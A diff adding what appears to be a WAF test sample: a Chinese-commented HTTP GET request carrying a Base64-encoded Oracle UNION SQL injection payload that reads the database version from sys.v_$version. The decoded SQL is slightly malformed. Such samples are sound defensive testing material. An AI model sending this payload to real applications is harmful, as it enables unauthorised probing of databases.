@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_查询版本(Base64编码)
+# 攻击者基于UNION查询，将"1 union select banner from sys.v_$version where rownum=1 from dual"语句经过base64编码注入到 SQL 查询参数中，从数据库系统视图 "sys.v_$version" 中选择 "banner" 列的值，将数据库的版本信息合并到原始查询的结果中，然后通过应用程序返回的响应来获取数据库版本信息。
+GET /?id=MSB1bmlvbiBzZWxlY3QgYmFubmVyIGZyb20gc3lzLnZfJHZlcnNpb24gd2hlcmUgcm93bnVtPTEgZnJvbSBkdWFs&bid=hd_tag_m8mv26j9 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26j9
+RM-PRO-Token: 7d2df8ba324a32f020b493f059d0f9b7
+RM-PRO-Time: 1742808622495
+User-Agent: curl/7.83.1
+
